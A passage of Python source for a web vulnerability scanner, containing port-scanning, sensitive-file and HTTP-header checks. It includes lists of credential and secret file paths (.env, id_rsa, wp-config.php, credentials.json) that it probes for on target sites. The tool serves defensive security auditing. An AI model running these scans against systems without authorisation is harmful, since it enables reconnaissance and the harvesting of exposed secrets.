                        'recommendation': "Validate file paths, use whitelisting, and avoid user-controlled filesystem operations"
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"Directory traversal found: {detail}")
                    
                    # We've found a vulnerability, no need to test every remaining payload
                    # Just test a different type of payload
                    break
            
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Error testing URL {test_url}: {str(e)}")
                continue
        
        if self.logger:
            self.logger.info(f"Completed directory traversal scan, found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities

###########################################
# PORT SCANNER
###########################################

class PortScanner:
    """Scanner for detecting open ports on a target host."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Port scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Socket connection timeout in seconds
            depth (int): Number of ports to scan (1=common, 2=extended, 3=full)
            user_agent (str): Not used for port scanning but required for consistency
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.logger = logger
        self.verbose = verbose
        
        # Extract hostname from URL
        parsed_url = urlparse(target_url)
        self.target_host = parsed_url.netloc.split(':')[0]  # Remove port from hostname if present
        
        # Common service names for well-known ports
        self.service_names = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            111: 'RPC',
            135: 'RPC',
            139: 'NetBIOS',
            143: 'IMAP',
            443: 'HTTPS',
            445: 'SMB',
            993: 'IMAPS',
            995: 'POP3S',
            1433: 'MSSQL',
            1521: 'Oracle',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            5901: 'VNC-1',
            5902: 'VNC-2',
            6379: 'Redis',
            8080: 'HTTP-Proxy',
            8443: 'HTTPS-Alt',
            9200: 'Elasticsearch',
            27017: 'MongoDB'
        }
    
    def _scan_port(self, port):
        """
        Check if a specific port is open on the target host.
        
        Args:
            port (int): The port number to scan
            
        Returns:
            tuple: (port, is_open, service_name) or None if error
        """
        try:
            # Create a socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Attempt to connect to the port
            result = sock.connect_ex((self.target_host, port))
            sock.close()
            
            if result == 0:  # Port is open
                # Get service name if known
                service_name = self.service_names.get(port, 'Unknown')
                
                if self.verbose and self.logger:
                    self.logger.info(f"Port {port} is open ({service_name})")
                
                return port, True, service_name
            
            return port, False, None
        
        except socket.error as e:
            if self.logger:
                self.logger.error(f"Error scanning port {port}: {str(e)}")
            return None
        except Exception as e:
            if self.logger:
                self.logger.error(f"Unexpected error scanning port {port}: {str(e)}")
            return None
    
    def _get_ports_to_scan(self):
        """
        Determine which ports to scan based on scan depth.
        
        Returns:
            list: List of port numbers to scan
        """
        # Common important ports
        common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 8080, 8443]
        
        # Extended set of ports
        extended_ports = common_ports + [
            20, 79, 111, 135, 161, 389, 636, 1025, 1434, 2049, 2082, 2083, 2181, 2222, 
            3000, 3128, 5000, 5060, 5601, 5900, 5984, 6379, 7001, 7002, 8000, 8089, 8888, 
            9000, 9090, 9200, 9300, 10000, 11211, 27017, 27018, 27019, 50070
        ]
        
        # Full scan adds port ranges
        if self.depth == 1:
            return common_ports
        elif self.depth == 2:
            return extended_ports
        else:  # depth > 2
            # More comprehensive port list
            additional_ports = list(range(1, 1025))  # Privileged ports
            additional_ports += [1027, 1028, 1029, 1050, 1080, 1099, 1241, 1337, 1440, 2000, 2001, 2301, 3333, 4000, 4001, 4002, 4100, 4200, 4243, 4443, 4444, 4567, 4711, 4712, 4713, 4714, 4715, 4716, 4717, 4718, 4719, 4720, 4730, 4731, 4732, 4733, 4734, 4735, 4736, 4737, 4738, 4739, 4740, 4750, 4760, 4761, 4762, 4763, 4764, 4765, 4766, 4767, 4768, 4769, 4770, 4771, 4772, 4773, 4774, 4775, 4776, 4777, 4778, 4779, 4780, 4790, 4800, 4801, 4802, 4803, 4804, 4805, 4806, 4807, 4808, 4809, 4810, 4820, 4830, 4840, 4841, 4842, 4843, 4844, 4845, 4846, 4847, 4848, 4849, 4850, 4851, 4852, 4853, 4854, 4855, 4856, 4857, 4858, 4859, 4860, 4870, 4871, 4872, 4873, 4874, 4875, 4876, 4877, 4878, 4879, 4880, 4881, 4882, 4883, 4884, 4885, 4886, 4887, 4888, 4889, 4890, 4900, 4910, 4911, 4912, 4913, 4914, 4915, 4916, 4917, 4918, 4919, 4920, 4921, 4922, 4923, 4924, 4925, 4926, 4927, 4928, 4929, 4930, 4931, 4932, 4933, 4934, 4935, 4936, 4937, 4938, 4939, 4940, 4941, 4942, 4943, 4944, 4945, 4946, 4947, 4948, 4949, 4950, 4951, 4952, 4953, 4954, 4955, 4956, 4957, 4958, 4959, 4960, 4970, 4971, 4972, 4973, 4974, 4975, 4976, 4977, 4978, 4979, 4980, 4981, 4982, 4983, 4984, 4985, 4986, 4987, 4988, 4989, 4990, 4991, 4992, 4993, 4994, 4995, 4996, 4997, 4998, 4999, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010, 5020, 5030, 5040, 5050, 5060, 5070, 5080, 5081, 5082, 5083, 5084, 5085, 5086, 5087, 5088, 5089, 5090, 5100, 5200, 5300, 5400, 5500, 5600, 5700, 5800, 5900, 5901, 5902, 5903, 6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6008, 6009, 6010, 6020, 6030, 6040, 6050, 6060, 6070, 6080, 6090, 6100, 6110, 6112, 6129, 6200, 6300, 6400, 6500, 6600, 6700, 6800, 6900, 7000, 7010, 7070, 7100, 7200, 7300, 7400, 7500, 7600, 7700, 7800, 7900, 8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8020, 8030, 8040, 8050, 8060, 8070, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8100, 8110, 8200, 8300, 8400, 8443, 8500, 8600, 8700, 8800, 8880, 8888, 8900, 9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009, 9010, 9020, 9030, 9040, 9050, 9060, 9070, 9080, 9090, 9100, 9200, 9300, 9400, 9500, 9600, 9700, 9800, 9900, 10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009, 10010, 10020, 10030, 10040, 10050, 10060, 10070, 10080, 10090, 10100, 10200, 10300, 10400, 10500, 10600, 10700, 10800, 10900, 11000, 11100, 11200, 11300, 12000, 12345, 13000, 14000, 15000, 16000, 17000, 18000, 19000, 20000, 25000, 30000, 35000, 40000, 45000, 50000, 55000, 60000]
            # Add the additional ports to the extended set
            return list(set(extended_ports + additional_ports))
    
    def scan(self):
        """
        Start the port scanning process.
        
        Returns:
            list: List of open port vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting port scan on {self.target_host}")
        
        try:
            # Get the list of ports to scan
            ports_to_scan = self._get_ports_to_scan()
            
            if self.verbose and self.logger:
                self.logger.info(f"Scanning {len(ports_to_scan)} ports on {self.target_host}")
            
            # Perform the scan with multi-threading if more than 20 ports
            if len(ports_to_scan) > 20:
                with concurrent.futures.ThreadPoolExecutor(max_workers=min(50, len(ports_to_scan))) as executor:
                    scan_results = list(filter(None, executor.map(self._scan_port, ports_to_scan)))
            else:
                # For fewer ports, scan sequentially
                scan_results = list(filter(None, map(self._scan_port, ports_to_scan)))
            
            # Process results
            open_ports = [r for r in scan_results if r[1]]  # Filter to only open ports
            
            for port, _, service_name in open_ports:
                # Create a vulnerability entry for each open port
                detail = f"Port {port} ({service_name}) is open on {self.target_host}"
                
                # Determine severity based on the service
                severity = 'Low'  # Default severity
                
                # Higher risk services get medium or high severity
                high_risk_services = ['RDP', 'Telnet', 'FTP', 'SMB', 'RPC', 'MongoDB', 'Redis', 'MSSQL', 'Oracle', 'MySQL', 'PostgreSQL']
                medium_risk_services = ['SSH', 'SMTP', 'DNS', 'VNC', 'POP3', 'IMAP', 'NetBIOS']
                
                if service_name in high_risk_services:
                    severity = 'High'
                elif service_name in medium_risk_services:
                    severity = 'Medium'
                
                # For HTTP/HTTPS services, typically lower severity unless non-standard port
                if service_name in ['HTTP', 'HTTPS'] and port not in [80, 443, 8080, 8443]:
                    severity = 'Medium'
                
                vulnerability = {
                    'type': 'Open Port',
                    'host': self.target_host,
                    'port': port,
                    'service': service_name,
                    'details': detail,
                    'severity': severity,
                    'recommendation': "Close unnecessary ports and implement proper firewall rules"
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Open port found: {detail}")
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during port scan: {str(e)}")
        
        if self.logger:
            self.logger.info(f"Completed port scan, found {len(vulnerabilities)} open ports")
        
        return vulnerabilities

###########################################
# SENSITIVE FILES SCANNER
###########################################

class SensitiveFileScanner:
    """Scanner for detecting sensitive or backup files on the server."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Sensitive File scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level (more files as depth increases)
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # Basic common files to check for
        self.common_files = [
            # Web configuration files
            ".htaccess",
            ".htpasswd",
            "web.config",
            "robots.txt",
            "sitemap.xml",
            "crossdomain.xml",
            
            # Environment files
            ".env",
            ".env.backup",
            ".env.bak",
            "env.php",
            "process.env",
            
            # PHP config/info files
            "config.php",
            "config.php.bak",
            "config.inc.php",
            "database.php",
            "settings.php",
            "setup.php",
            "php.ini",
            "info.php",
            "phpinfo.php",
            
            # CMS specific files
            "wp-config.php",
            "wp-config.php.bak",
            "wp-config.php~",
            "wp-config.php.save",
            "configuration.php",  # Joomla
            "joomla.xml",
            "Drupal.zip",
            
            # Developer mistakes
            "debug.php",
            "test.php",
            "test.html",
            "test.txt",
            "install.php",
            "INSTALL.txt",
            "INSTALL.md",
            "install.txt",
            "install.log",
            
            # Backup files
            "backup.zip",
            "backup.sql",
            "backup.tar.gz",
            "dump.sql",
            "database.sql",
            "database.sql.gz",
            "data.sql",
            "backup/",
            
            # Server-side logs
            "access.log",
            "error.log",
            "server.log",
            "logs/",
            
            # Version control
            ".git/HEAD",
            ".git/config",
            ".svn/entries",
            ".svn/all-wcprops",
            ".hg/",
            ".gitlab-ci.yml",
            ".travis.yml",
            
            # Documentation & Readme files
            "README.md",
            "README.txt",
            "CHANGELOG.md",
            "CHANGELOG.txt",
            "LICENSE.txt",
            "CONTRIBUTING.md",
            
            # Common misconfigurations
            "phpMyAdmin/",
            "phpmyadmin/",
            "admin/",
            "admin.php",
            "administrator/",
            "login.php",
            "wp-login.php",
            
            # API endpoints
            "api/",
            "v1/",
            "v2/",
            "swagger/",
            "swagger-ui.html",
            "api-docs/",
            
            # Docker/Kubernetes files
            "docker-compose.yml",
            "Dockerfile",
            "kubernetes.yaml",
            "deployment.yaml",
            
            # JavaScript files
            "package.json",
            "package-lock.json",
            "yarn.lock",
            
            # Python files
            "requirements.txt",
            "manage.py",  # Django
            
            # Temporary and editor files
            ".DS_Store",
            ".vscode/",
            ".idea/",
            "*.swp",
            "*.swo",
            "*~",
            
            # Server-specific files
            "web.xml",
            "server-status",
            "server-info",
            
            # Credentials & keys
            "credentials.json",
            "id_rsa",
            "id_rsa.pub",
            "id_dsa",
            "id_dsa.pub"
        ]
        
        # Additional files to check if depth > 1
        self.extended_files = [
            # Common file extensions with backup indicators
            ".php.bak", ".php~", ".php.old", ".php.swp", ".php.save",
            ".asp.bak", ".asp~", ".asp.old", ".asp.swp", ".asp.save",
            ".aspx.bak", ".aspx~", ".aspx.old", ".aspx.swp", ".aspx.save",
            ".js.bak", ".js~", ".js.old", ".js.swp", ".js.save", ".js.map",
            ".txt.bak", ".txt~", ".txt.old", ".txt.swp", ".txt.save",
            ".sql.bak", ".sql~", ".sql.old", ".sql.swp", ".sql.save",
            ".conf.bak", ".conf~", ".conf.old", ".conf.swp", ".conf.save",
            ".xml.bak", ".xml~", ".xml.old", ".xml.swp", ".xml.save",
            ".json.bak", ".json~", ".json.old", ".json.swp", ".json.save",
            
            # More config files
            "authorization.config",
            "global.asax",
            "applicationHost.config",
            ".htaccess.bak",
            ".htpasswd.bak",
            "httpd.conf",
            "nginx.conf",
            "server.conf",
            "sites-available/",
            
            # More detailed backup files
            "database_backup/",
            "db_backup/",
            "site_backup/",
            "www.zip",
            "www.tar.gz",
            "wwwdata.zip",
            "backup-latest.zip",
            "latest-dump.sql",
            "site-backup-[0-9]*.zip",
            
            # More complete version control exposure
            ".git/refs/heads/master",
            ".git/index",
            ".git/logs/",
            ".svn/wc.db",
            
            # More CMS specific files
            "wp-content/debug.log",
            "wp-content/uploads/",
            "wp-content/plugins/",
            "administrator/logs/",
            "typo3conf/",
            
            # Additional API and development files
            "api/swagger.json",
            "openapi.json",
            "api/spec",
            "graphql",
            "graphiql",
            ".eslintrc",
            "babel.config.js",
            "webpack.config.js",
            
            # Database files
            "*.sqlite",
            "*.sqlite3",
            "*.db",
            "dump.rdb",
            
            # Additional logs and debug
            "npm-debug.log",
            "yarn-debug.log",
            "debug.log",
            "nohup.out",
            
            # Configuration management
            "ansible.cfg",
            "puppet.conf",
            "chef.rb",
            "terraform.tfstate",
            
            # Additional credentials
            "secrets.yml",
            "credentials.yml",
            "config/credentials/",
            "aws.json",
            "aws-config.json",
            
            # Infrastructure
            "nginx/",
            "apache/",
            "redis/",
            "mysql/",
            "postgres/"
        ]
    
    def _construct_file_paths(self):
        """
        Construct file paths to test based on the target URL.
        
        Returns:
            list: List of file paths to check
        """
        parsed_url = urlparse(self.target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Path components from the URL
        path_parts = [p for p in parsed_url.path.split('/') if p]
        
        test_paths = []
        
        # Base web root tests
        for file_path in self.common_files:
            test_url = f"{base_url}/{file_path}"
            test_paths.append(test_url)
        
        # Add extended files if depth allows
        if self.depth > 1:
            for file_path in self.extended_files:
                test_url = f"{base_url}/{file_path}"
                test_paths.append(test_url)
                
            # Also try files in direct subdirectories if URL includes a path
            if path_parts:
                # Get possible parent directories from the URL path
                current_path = ""
                for part in path_parts:
                    current_path += f"/{part}"
                    parent_url = f"{base_url}{current_path}"
                    
                    # Try common files in this directory
                    for file_path in self.common_files:
                        test_url = f"{parent_url}/{file_path}"
                        test_paths.append(test_url)
                    
                    # Only add extended files to the first level for performance
                    if current_path == f"/{path_parts[0]}" and self.depth > 2:
                        for file_path in self.extended_files:
                            test_url = f"{parent_url}/{file_path}"
                            test_paths.append(test_url)
        
        # Add aggressive file path tests if depth allows
        if self.depth > 2:
            # Template for derived paths
            if path_parts:
                # Try to derive possible sensitive paths from the URL structure
                # For example, if URL has /admin/users, check for /admin/config, /admin/backup, etc.
                if len(path_parts) > 1:
                    parent_dir = f"{base_url}/{path_parts[0]}"
                    interesting_suffixes = ["config", "backup", "settings", "admin", "setup", "install", "db", "test"]
                    
                    for suffix in interesting_suffixes:
                        test_url = f"{parent_dir}/{suffix}"
                        test_paths.append(test_url)
                        test_paths.append(f"{test_url}/")
        
        # Remove duplicates
        test_paths = list(set(test_paths))
        
        if self.verbose and self.logger:
            self.logger.info(f"Generated {len(test_paths)} file paths to check")
        
        return test_paths
    
    def _check_file_exists(self, url):
        """
        Check if a file exists on the server.
        
        Args:
            url (str): The URL to check
            
        Returns:
            tuple: (url, status_code, content_length, content_type) if file exists, None otherwise
        """
        try:
            response = requests.head(
                url, 
                headers=self.headers, 
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Some servers don't support HEAD requests correctly, fallback to GET
            if response.status_code >= 400:
                response = requests.get(
                    url, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    allow_redirects=False,
                    stream=True  # Use streaming to avoid downloading large files
                )
                # Just read a small part of the response to check content type
                content = next(response.iter_content(1024), b'')
                content_length = len(content)
                # Get the real content length if available in headers
                if 'Content-Length' in response.headers:
                    content_length = int(response.headers['Content-Length'])
            else:
                content_length = 0
                if 'Content-Length' in response.headers:
                    content_length = int(response.headers['Content-Length'])
            
            # Check status code - we consider 200-399 as "exists"
            if 200 <= response.status_code < 400:
                content_type = response.headers.get('Content-Type', 'unknown')
                
                if self.verbose and self.logger:
                    self.logger.info(f"Found {url} - Status: {response.status_code}, Length: {content_length}, Type: {content_type}")
                
                return url, response.status_code, content_length, content_type
            
            return None
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error checking {url}: {str(e)}")
            return None
    
    def _determine_severity(self, file_path, content_type):
        """
        Determine the severity level based on the file path and content type.
        
        Args:
            file_path (str): The file path
            content_type (str): The content type of the file
            
        Returns:
            str: Severity level (Critical, High, Medium, Low, Info)
        """
        # Critical files that likely contain credentials or sensitive info
        critical_files = [
            ".env", "config.php", "wp-config.php", "configuration.php", 
            "database.php", "settings.php", "id_rsa", "secrets.yml", "credentials"
        ]
        
        # High severity files that might contain sensitive info
        high_files = [
            "backup", "dump.sql", "database.sql", "sql", "htpasswd", 
            "access.log", "error.log", "server.log", "debug.log", ".git/", ".svn/"
        ]
        
        # Medium severity files that might give information about the system
        medium_files = [
            "phpinfo", "info.php", "test", "install", "setup", "admin", "api", 
            "swagger", "package.json", "robots.txt", "web.config", "htaccess"
        ]
        
        # Potentially interesting file types by MIME
        critical_types = ["application/x-httpd-php", "application/x-sh", "text/x-php"]
        high_types = ["application/sql", "application/x-sql", "application/octet-stream", "application/x-tar", "application/zip"]
        
        # Check if the file path contains any critical patterns
        for pattern in critical_files:
            if pattern in file_path.lower():
                return "Critical"
        
        # Check content type for critical patterns
        for pattern in critical_types:
            if pattern in content_type.lower():
                return "Critical"
        
        # Check for high severity patterns
        for pattern in high_files:
            if pattern in file_path.lower():
                return "High"
        
        # Check content type for high severity patterns
        for pattern in high_types:
            if pattern in content_type.lower():
                return "High"
        
        # Check for medium severity patterns
        for pattern in medium_files:
            if pattern in file_path.lower():
                return "Medium"
        
        # Default severity is low
        return "Low"
    
    def scan(self):
        """
        Start the sensitive file scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting sensitive file scan on {self.target_url}")
        
        # Generate file paths to test
        test_paths = self._construct_file_paths()
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing {len(test_paths)} potential sensitive files")
        
        # Test each path for existence
        for test_url in test_paths:
            result = self._check_file_exists(test_url)
            if result:
                url, status_code, content_length, content_type = result
                
                # Extract the file path from the URL
                file_path = url.split('://', 1)[1].split('/', 1)[1] if '/' in url.split('://', 1)[1] else ""
                
                # Determine the severity
                severity = self._determine_severity(file_path, content_type)
                
                detail = f"Sensitive file found: {file_path}"
                vulnerability = {
                    'type': 'Sensitive File Exposure',
                    'url': url,
                    'file_path': file_path,
                    'status_code': status_code,
                    'content_length': content_length,
                    'content_type': content_type,
                    'details': detail,
                    'severity': severity,
                    'recommendation': "Remove or restrict access to sensitive files and use appropriate security controls"
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Sensitive file found: {url}")
        
        if self.logger:
            self.logger.info(f"Completed sensitive file scan, found {len(vulnerabilities)} files")
        
        return vulnerabilities

###########################################
# HTTP HEADERS SCANNER
###########################################

class HTTPHeaderScanner:
    """Scanner for detecting HTTP header security issues."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the HTTP Headers scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Not used for header scanning but required for consistency
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # List of security headers to check for
        self.security_headers = {
            'Strict-Transport-Security': {
                'description': 'HTTP Strict Transport Security (HSTS) forces secure connections to the server',
                'recommendation': 'Add "Strict-Transport-Security: max-age=31536000; includeSubDomains" header',
                'severity': 'Medium'
            },
            'Content-Security-Policy': {
                'description': 'Content Security Policy prevents XSS and data injection attacks',
                'recommendation': 'Implement a Content Security Policy that restricts resource loading',
                'severity': 'Medium'
            },
            'X-Content-Type-Options': {
                'description': 'Prevents MIME-sniffing a response away from the declared content-type',
                'recommendation': 'Add "X-Content-Type-Options: nosniff" header',
                'severity': 'Medium'
            },
            'X-Frame-Options': {
                'description': 'Protects website against clickjacking attacks',
                'recommendation': 'Add "X-Frame-Options: DENY" or "X-Frame-Options: SAMEORIGIN" header',
                'severity': 'Medium'
            },
            'X-XSS-Protection': {
                'description': 'Enables XSS filtering in browser (deprecated in modern browsers in favor of CSP)',
                'recommendation': 'Add "X-XSS-Protection: 1; mode=block" header',
                'severity': 'Low'
            },
            'Referrer-Policy': {
                'description': 'Controls how much referrer information is included with requests',
                'recommendation': 'Add appropriate Referrer-Policy header like "strict-origin-when-cross-origin"',
                'severity': 'Low'
            },
            'Feature-Policy': {
                'description': 'Controls which browser features can be used (now renamed to Permissions-Policy)',
                'recommendation': 'Implement Feature-Policy or Permissions-Policy to restrict browser features',
                'severity': 'Low'
            },
            'Permissions-Policy': {
                'description': 'Controls which browser features and APIs can be used',
                'recommendation': 'Implement Permissions-Policy to restrict browser features',
                'severity': 'Low'
            },
            'Public-Key-Pins': {
                'description': 'HPKP pins a site to specific certificate keys (considered high risk, deprecated)',
                'recommendation': 'Consider using Certificate Transparency instead of HPKP',
                'severity': 'Info'
            },
            'Cache-Control': {
                'description': 'Directs browsers and CDNs on how to cache content',
                'recommendation': 'Use appropriate Cache-Control headers for sensitive content',
                'severity': 'Low'
            },
            'Clear-Site-Data': {
                'description': 'Clears browser data (cookies, storage, cache) for the website',
                'recommendation': 'Use Clear-Site-Data header on logout pages',
                'severity': 'Info'
            }
        }
        
        # Headers that might expose sensitive information
        self.sensitive_headers = {
            'Server': {
                'description': 'Reveals web server information',
                'recommendation': 'Remove or obscure the Server header',
                'severity': 'Low'
            },
            'X-Powered-By': {
                'description': 'Reveals technology/framework used by the web application',
                'recommendation': 'Remove the X-Powered-By header',
                'severity': 'Low'
            },
            'X-AspNet-Version': {
                'description': 'Reveals the ASP.NET version',
                'recommendation': 'Remove the X-AspNet-Version header',
                'severity': 'Low'
            },
            'X-AspNetMvc-Version': {
                'description': 'Reveals the ASP.NET MVC version',
                'recommendation': 'Remove the X-AspNetMvc-Version header',
                'severity': 'Low'
            },
            'X-Runtime': {
                'description': 'Reveals the application runtime',
                'recommendation': 'Remove the X-Runtime header',
                'severity': 'Low'
            },
            'X-Generator': {
                'description': 'Reveals the technology used to generate the page',
                'recommendation': 'Remove the X-Generator header',
                'severity': 'Low'
            },
            'X-Debug': {
                'description': 'Debug information may be disclosed',
                'recommendation': 'Remove the X-Debug header in production',
                'severity': 'Medium'
            }
        }
    
    def _analyze_cookie_security(self, cookies):
        """
        Analyze cookie security based on missing security attributes.
        
        Args:
            cookies (list): List of cookies from response
            
        Returns:
            list: Vulnerabilities found in cookies
        """
        vulnerabilities = []
        
        for cookie in cookies:
            cookie_name = cookie.name
            cookie_attrs = []
            
            # Check for Secure flag
            if not cookie.secure:
                cookie_attrs.append({
                    'name': 'Secure',
                    'description': 'Cookie not marked as Secure, allowing transmission over HTTP',
                    'recommendation': f'Add Secure flag to the {cookie_name} cookie',
                    'severity': 'Medium'
                })
            
            # Check for HttpOnly flag
            if not cookie.has_nonstandard_attr('HttpOnly'):
                cookie_attrs.append({
                    'name': 'HttpOnly',
                    'description': 'Cookie not marked as HttpOnly, allowing JavaScript access',
                    'recommendation': f'Add HttpOnly flag to the {cookie_name} cookie',
                    'severity': 'Medium'
                })
            
            # Check for SameSite attribute
            if not cookie.has_nonstandard_attr('SameSite'):
                cookie_attrs.append({
                    'name': 'SameSite',
                    'description': 'Cookie does not have SameSite attribute, making it vulnerable to CSRF attacks',
                    'recommendation': f'Add SameSite=Strict or SameSite=Lax to the {cookie_name} cookie',
                    'severity': 'Medium'
                })
            
            # Add findings for this cookie
            for attr in cookie_attrs:
                vulnerability = {
                    'type': 'Insecure Cookie',
                    'url': self.target_url,
                    'cookie': cookie_name,
                    'missing_attribute': attr['name'],
                    'details': attr['description'],
                    'recommendation': attr['recommendation'],
                    'severity': attr['severity']
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Insecure cookie '{cookie_name}': Missing {attr['name']} attribute")
        
        return vulnerabilities
    
    def _analyze_header_values(self, headers):
        """
        Analyze header values for potential security issues.
        
        Args:
            headers (dict): Response headers
            
        Returns:
            list: Vulnerabilities found in header values
        """
        vulnerabilities = []
        
        # Check for missing security headers
        for header_name, header_info in self.security_headers.items():
            if header_name not in headers:
                vulnerability = {
                    'type': 'Missing Security Header',
                    'url': self.target_url,
                    'header': header_name,
                    'details': header_info['description'],
                    'recommendation': header_info['recommendation'],
                    'severity': header_info['severity']
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Missing security header: {header_name}")
        
        # Check for information disclosure headers
        for header_name, header_info in self.sensitive_headers.items():
            if header_name in headers:
                vulnerability = {
                    'type': 'Information Disclosure',
                    'url': self.target_url,
                    'header': header_name,
                    'value': headers[header_name],
                    'details': header_info['description'],
                    'recommendation': header_info['recommendation'],
                    'severity': header_info['severity']
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Information disclosure header: {header_name}: {headers[header_name]}")
        
        # Additional checks for specific headers
        if 'Strict-Transport-Security' in headers:
            hsts_value = headers['Strict-Transport-Security']
            if 'max-age=' in hsts_value:
                try:
                    max_age = int(hsts_value.split('max-age=')[1].split(';')[0].strip())
                    if max_age < 31536000:  # Less than 1 year
                        vulnerability = {
                            'type': 'Weak Security Header',
                            'url': self.target_url,
                            'header': 'Strict-Transport-Security',
                            'value': hsts_value,
                            'details': 'HSTS max-age is less than 1 year, which is not sufficient',
                            'recommendation': 'Use a max-age of at least 31536000 seconds (1 year)',
                            'severity': 'Low'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"Weak HSTS header: max-age too low ({max_age})")
                except ValueError:
                    pass
            
            if 'includeSubDomains' not in hsts_value:
                vulnerability = {
                    'type': 'Weak Security Header',
                    'url': self.target_url,
                    'header': 'Strict-Transport-Security',
                    'value': hsts_value,
                    'details': 'HSTS does not include subdomains, which may expose them to attacks',
                    'recommendation': 'Add includeSubDomains directive to HSTS header',
                    'severity': 'Low'
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning("Weak HSTS header: missing includeSubDomains directive")
        
        # Check Content-Security-Policy for 'unsafe-inline' or 'unsafe-eval'
        if 'Content-Security-Policy' in headers:
            csp_value = headers['Content-Security-Policy']
            if "unsafe-inline" in csp_value or "unsafe-eval" in csp_value:
                vulnerability = {
                    'type': 'Weak Security Header',
                    'url': self.target_url,
                    'header': 'Content-Security-Policy',
                    'value': csp_value,
                    'details': 'CSP contains unsafe-inline or unsafe-eval, which weakens its protection',
                    'recommendation': 'Avoid using unsafe-inline and unsafe-eval in CSP',
                    'severity': 'Medium'
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning("Weak CSP header: contains unsafe directives")
        
        return vulnerabilities
    
    def _check_ssl_redirect(self, headers, url):
        """
        Check if HTTP redirects to HTTPS properly.
        
        Args:
            headers (dict): Response headers
            url (str): The URL that was tested
            
        Returns:
            dict or None: Vulnerability if HTTP doesn't redirect to HTTPS, None otherwise
        """
        parsed_url = urlparse(url)
        if parsed_url.scheme == 'https':
            return None  # Already using HTTPS
        
        # Check for a redirect
        location = headers.get('Location')
        if not location:
            # No redirect found
            vulnerability = {
                'type': 'Insecure Protocol',
                'url': url,
                'protocol': 'HTTP',
                'details': 'Site does not redirect from HTTP to HTTPS',
                'recommendation': 'Implement HTTP to HTTPS redirection (301 Redirect)',
                'severity': 'Medium'
            }
            
            if self.logger:
                self.logger.warning("Insecure Protocol: No HTTP to HTTPS redirection")
            
            return vulnerability
        
        # Check if the redirect is to HTTPS
        if not location.startswith('https://'):
            vulnerability = {
                'type': 'Insecure Redirect',
                'url': url,
                'redirect_url': location,
                'details': 'Site redirects to non-HTTPS URL',
                'recommendation': 'Redirect to HTTPS version of the site',
                'severity': 'Medium'
            }
            
            if self.logger:
                self.logger.warning(f"Insecure Redirect: HTTP to non-HTTPS URL ({location})")
            
            return vulnerability
        
        return None
    
    def scan(self):
        """
        Start the HTTP header security scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting HTTP header scan on {self.target_url}")
        
        try:
            # First check if using HTTPS
            parsed_url = urlparse(self.target_url)
            if parsed_url.scheme != 'https':
                # Construct HTTP URL for testing redirect
                http_url = f"http://{parsed_url.netloc}{parsed_url.path}"
                
                if self.verbose and self.logger:
                    self.logger.info(f"Testing HTTP to HTTPS redirection: {http_url}")
                
                try:
                    response = requests.get(
                        http_url,
                        headers=self.headers,
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check if HTTP properly redirects to HTTPS
                    redirect_vuln = self._check_ssl_redirect(response.headers, http_url)
                    if redirect_vuln:
